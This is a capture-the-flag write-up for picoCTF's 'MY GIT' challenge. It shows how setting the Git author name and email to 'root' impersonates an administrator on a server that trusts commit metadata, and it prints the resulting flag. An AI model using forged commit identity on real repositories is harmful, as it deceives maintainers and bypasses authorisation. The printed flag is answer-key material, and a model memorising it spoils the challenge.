# Challenge: MY GIT
# Description:
I have built my own Git server with my own rules!
Additional details will be available after launching your challenge instance.

Hint:
How do you specify your Git username and email?

# Approach

git config user.name "root"

git config user.email "root@picoctf"

echo "Request Flag" > flag.txt

git add flag.txt

git commit -m "push to get the flag"

(Here resolve your commit options, mine is GPG)

git branch

git push origin master
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
git@foggy-cliff.picoctf.net's password:
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 20 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 945 bytes | 59.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{1mp3rs0n4t4_g17_345y_e522152d}
To ssh://foggy-cliff.picoctf.net:51226/git/challenge.git
   b4df14d..44980d7  master -> master

Final Flag:
picoCTF{1mp3rs0n4t4_g17_345y_e522152d}
